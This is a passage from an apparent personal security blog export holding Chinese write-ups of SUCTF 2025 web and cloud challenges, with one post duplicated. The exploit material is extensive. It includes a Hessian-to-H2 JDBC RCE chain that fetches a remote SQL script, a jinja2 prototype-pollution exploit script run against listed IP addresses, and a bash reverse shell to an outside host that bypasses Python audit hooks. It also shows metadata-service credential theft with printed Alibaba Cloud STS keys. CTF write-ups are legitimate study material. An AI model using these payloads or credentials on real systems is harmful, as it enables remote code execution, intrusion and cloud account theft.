render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) 除了之前用到的接口，只剩下一个/Admin\n这里有一个原型链污染，不过题目要我们RCE，所以我们要结合一下jinja2的一个模版渲染\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwaf里数字只剩下2，也是指引我们打jinja2\n我们还需要获取sys模块，上面文章链接中的一个payload是用了__loader__，但是这题被ban了\n那我们只能用__spec__来代替__loader__来获取到sys模块\n因为模版编译只在第一次访问时才编译，所以要卡容器重启的第一时间才能打通\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery 由404页面可以很明显的知道是一个临时服务php -S开启的\n再根据去年出的一个洞，由php -S开启的服务在特定版本下能够读取源码\nhttps://cloud.tencent.com/developer/article/2235691\n所以这里也是有模学样的拿到源码\n后续打的时候碰到别人写的shell，然后用源码泄漏看参数就直接打进去了(这也是公共环境做题思路的一部分叭xsl)\n","date":"2025-01-18T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"2025-SUCTF-WP"},{"categories":null,"contents":" 1231 456 友链名称2 友链描述2 ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"友链"},{"categories":null,"contents":"一名大二在读学生\nSyclover \u0026amp; 0XFFF 成员\n对各种安全感兴趣，目前主要学习的还的是Web安全（Java 安全、云安全等）\n最爱吃，最喜欢吃的是🍉，最喜欢干的事情就是大夏天抱着半个西瓜拿勺子挖着吃然后看视频\n会打点小游戏（其实从小学之前就开始打游戏了hh\n什么都想学，但什么都不会\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"},{"categories":null,"contents":"SU_ez_solon 题目直接给了个hessian反序列化的接口\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } 不过他这个反序列化还给了一个toString()的调用\n然后再观察一下给的依赖\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2和fastjson这俩依赖写一起的，再加上上面的toString(),指向型很强了,就是让我们利用fastjson的getter打一个JDBC攻击\n做题过程 做题的时候找了有几个能打通的类，但都因为sofa-hessian自带的反序列化名单被做掉了\n我们需要知道在打h2的jdbc时，最后都会走向哪个类的哪个方法\norg.h2.jdbc.JdbcConnection.JdbcConnection()\n就是JdbcConnection的构造方法，以此为根据去找哪些getter会实例化一个JdbcConnection类\n这里可以写codeql来找，我有点懒没咋写，这里写我找到的两个方法\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource 第一个被黑名单ban了，但是它给了我们些许灵感，JdbcDataSource类实现了DataSource接口，继承这个接口的类都要重写getConnection()方法，所以我们可以去根据继承关系来寻找适合的方法\n所以我们找到了UnpooledDataSource方法，即不在黑名单上，而且他的构造方法和getConnection也很有意思\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } 构造方法会自动根据你的driverClassName来注册对应驱动类，然后getConnection()也会直接从DriverManager中进行Connection操作，泛用性很强\n然后后面常规打h2RCE的思路了，有一个SecurityManager要绕，其实直接调用setSecurityManager(null)就好了\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) 确实是很简单的一个云渗透\n前面要从python那里拿个shell，不过有hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) 这里_posixsubprocess.fork_exec这个hook是抓不了的，所以它等于白写\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) 直接拿shell，然后用pty升级一下自己的shell\n进shell之后要信息搜集一下，这里常用思路就是用cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... 与题目名字相结合，知道了关键信息\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 然后去看文档\n很明显在题目内是没有开加固模式的,我们这里直接访问就好\n然后拿到了一个ak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } 很明显就是要我们去oss🪣里看flag，上去发现被删了，不过没多大问题，这里我们看之前版本的内容就好了\nSU_blog 注册接口有个任意用户密码重置的洞，这里直接用admin做用户名就能重置admin的密码了\n也省了后面爆破jwt密钥的操作\n看到article里的传参，很明显的文件路径，这里尝试一下能不能路径穿越\n发现加../和不加是一样的，猜测后端进行了replace操作\n所以试一下双写..../，然后就能读了\n读到源码和waf(waf我这里用waf\u0026hellip;/py来绕过读到)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;未提供文件名。\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;大黑阔不许看\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无效的文件路径。\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无权访问该文件。\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;文件未找到。\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;读取文件时发生错误。\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) 除了之前用到的接口，只剩下一个/Admin\n这里有一个原型链污染，不过题目要我们RCE，所以我们要结合一下jinja2的一个模版渲染\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwaf里数字只剩下2，也是指引我们打jinja2\n我们还需要获取sys模块，上面文章链接中的一个payload是用了__loader__，但是这题被ban了\n那我们只能用__spec__来代替__loader__来获取到sys模块\n因为模版编译只在第一次访问时才编译，所以要卡容器重启的第一时间才能打通\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery 由404页面可以很明显的知道是一个临时服务php -S开启的\n再根据去年出的一个洞，由php -S开启的服务在特定版本下能够读取源码\nhttps://cloud.tencent.com/developer/article/2235691\n所以这里也是有模学样的拿到源码\n后续打的时候碰到别人写的shell，然后用源码泄漏看参数就直接打进去了(这也是公共环境做题思路的一部分叭xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/test/","section":"post","tags":null,"title":"SUCTF"},{"categories":null,"contents":"SU_ez_solon 题目直接给了个hessian反序列化的接口\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } 不过他这个反序列化还给了一个toString()的调用\n然后再观察一下给的依赖\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2和fastjson这俩依赖写一起的，再加上上面的toString(),指向型很强了,就是让我们利用fastjson的getter打一个JDBC攻击\n做题过程 做题的时候找了有几个能打通的类，但都因为sofa-hessian自带的反序列化名单被做掉了\n我们需要知道在打h2的jdbc时，最后都会走向哪个类的哪个方法\norg.h2.jdbc.JdbcConnection.JdbcConnection()\n就是JdbcConnection的构造方法，以此为根据去找哪些getter会实例化一个JdbcConnection类\n这里可以写codeql来找，我有点懒没咋写，这里写我找到的两个方法\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource 第一个被黑名单ban了，但是它给了我们些许灵感，JdbcDataSource类实现了DataSource接口，继承这个接口的类都要重写getConnection()方法，所以我们可以去根据继承关系来寻找适合的方法\n所以我们找到了UnpooledDataSource方法，即不在黑名单上，而且他的构造方法和getConnection也很有意思\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } 构造方法会自动根据你的driverClassName来注册对应驱动类，然后getConnection()也会直接从DriverManager中进行Connection操作，泛用性很强\n然后后面常规打h2RCE的思路了，有一个SecurityManager要绕，其实直接调用setSecurityManager(null)就好了\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS 